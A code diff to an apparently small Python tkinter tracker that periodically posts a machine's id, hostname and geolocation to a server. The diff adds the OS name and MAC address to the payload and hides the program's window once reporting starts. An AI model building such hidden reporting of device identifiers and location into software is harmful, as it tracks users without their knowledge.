@@ -5,8 +5,8 @@ import time
 import datasaver
 import _thread
 from tkinter import messagebox
-import ip_to_location_finder
-
+import platform
+from uuid import getnode as get_mac
 
 labels = [
     'id',
@@ -125,6 +125,8 @@ class Window(Frame):
         _thread.start_new_thread(self.send_data_to_server, (interval,))
 
     def send_data_to_server(self, interval):
+        # self.grid_forget()
+        withdraw()
         self.show_ip_hostname(self.get_ip(), socket.gethostname())
         data = datasaver.getData()
         url = data[-1]
@@ -134,6 +136,8 @@ class Window(Frame):
                     "id": data[0],
                     "hostname": data[1],
                     "loc": self.get_lat_long(),
+                    "os": platform.system(),
+                    "mac": get_mac(),
                 })
             except Exception as e:
                 print("There was an error sending the data to server ", e)
@@ -151,6 +155,8 @@ class Window(Frame):
         return data['loc']
 
 
+def withdraw():
+    root.withdraw()
 root = Tk()
 #size of the window
 root.geometry("400x300")
